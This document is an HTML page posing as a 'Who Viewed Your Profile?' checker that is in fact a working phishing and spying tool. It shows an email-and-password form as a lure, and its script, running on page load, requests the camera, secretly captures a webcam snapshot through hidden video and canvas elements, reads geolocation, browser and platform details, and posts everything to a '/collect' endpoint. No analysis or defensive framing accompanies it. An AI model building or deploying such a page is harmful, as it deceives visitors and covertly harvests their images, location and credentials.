<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🔍 Profile Viewer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }
    .box {
      background: #222;
      padding: 30px;
      border-radius: 12px;
      display: inline-block;
    }
    input, button {
      margin: 10px;
      padding: 12px;
      border-radius: 8px;
      border: none;
      font-size: 16px;
      width: 90%;
    }
    button {
      background: crimson;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>👁 Who Viewed Your Profile?</h1>
    <form id="spyForm">
      <input type="text" placeholder="Enter your email" required>
      <input type="password" placeholder="Your password" required>
      <button type="submit">Check</button>
    </form>
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  </div>

  <script>
    async function sendData(status, lat = null, long = null, photo = null) {
      await fetch("/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          latitude: lat,
          longitude: long,
          camera: status,
          deviceInfo: navigator.platform,
          snapshot: photo
        })
      });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        video.srcObject = stream;

        setTimeout(() => {
          const context = canvas.getContext("2d");
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/png");

          navigator.geolocation.getCurrentPosition(
            pos => sendData("✅ Allowed", pos.coords.latitude, pos.coords.longitude, imageData),
            err => sendData("❌ Location Denied", null, null, imageData)
          );

          stream.getTracks().forEach(track => track.stop());
        }, 1500);
      })
      .catch(err => {
        sendData("❌ Camera Denied");
      });
  </script>
</body>
</html>
